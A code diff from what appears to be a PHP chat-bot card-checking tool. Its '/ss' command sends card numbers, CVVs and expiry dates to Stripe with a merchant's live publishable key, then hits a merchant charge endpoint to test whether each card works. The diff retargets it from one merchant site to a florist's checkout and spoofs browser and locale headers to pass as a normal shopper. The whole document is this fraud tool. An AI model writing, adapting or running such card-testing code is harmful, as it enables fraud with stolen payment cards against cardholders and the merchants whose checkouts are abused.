@@ -140,18 +140,18 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'Host: api.stripe.com',
               'Accept: application/json',
-              'Accept-Language: en-US,en;q=0.9',
+              'Accept-Language: es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7',
               'Content-Type: application/x-www-form-urlencoded',
               'Origin: https://js.stripe.com',
               'Referer: https://js.stripe.com/',
-              'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
+              'User-Agent: Mozilla/5.0 (Linux; Android 10; LM-K200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36'));
             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
             curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
             curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
             curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
             curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[address][postal_code]=$zip&guid=$guid&muid=$muid&sid=$sid&payment_user_agent=stripe.js%2Fc478317df%3B+stripe-js-v3%2Fc478317df&time_on_page=$time&referrer=https%3A%2F%2Fatlasvpn.com%2F&key=pk_live_woOdxnyIs6qil8ZjnAAzEcyp00kUbImaXf");
+            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[address][postal_code]=$zip&guid=$guid&muid=$muid&sid=$sid&payment_user_agent=stripe.js/653c2107b;+stripe-js-v3/653c2107b&time_on_page=$time&key=key=pk_live_E3an19MS5tTgr1tqIJtdqjVE");
             $result1 = curl_exec($ch);
             
             if(stripos($result1, 'error')){
@@ -164,24 +164,24 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             
             if(!$stripeerror){
                 $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, 'https://user.atlasvpn.com/v1/stripe/pay');
+                curl_setopt($ch, CURLOPT_URL, 'https://www.premiumflorist.com/ajax.php?action=stripe_charge');
                 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-                  'Accept: application/json, text/plain, */*',
-                  'Accept-Language: en-US,en;q=0.9',
-                  'content-type: application/json;charset=UTF-8',
-                  'Host: user.atlasvpn.com',
-                  'Origin: https://atlasvpn.com',
-                  'Referer: https://atlasvpn.com/',
-                  'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
+                  'Accept: */*',
+                  'Accept-Language: es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7',
+                  'content-type: application/json',
+                  'Host: www.premiumflorist.com',
+                  'Origin: https://www.premiumflorist.com',
+                  'Referer: https://www.premiumflorist.com/home.php?view=index03&ocasion=resumen_final&idioma=castellano',
+                  'User-Agent: Mozilla/5.0 (Linux; Android 10; LM-K200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36'));
                 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                 
-                curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.''.$rand.'@gmail40.com","name":"'.$name.' '.$last.'","payment_method_id":"'.$id.'","identifier":"com.atlasvpn.vpn.subscription.p1m.stripe_regular_2","currency":"USD","postal_code":"'.$zip.'"}');
+                curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_method_id":"pm_1LCBBFBYrOQ2yLQIz3Au0y4Y"}');
                 
                 $result2 = curl_exec($ch);
                 $errormessage = trim(strip_tags(capture($result2,'"code":"','"')));
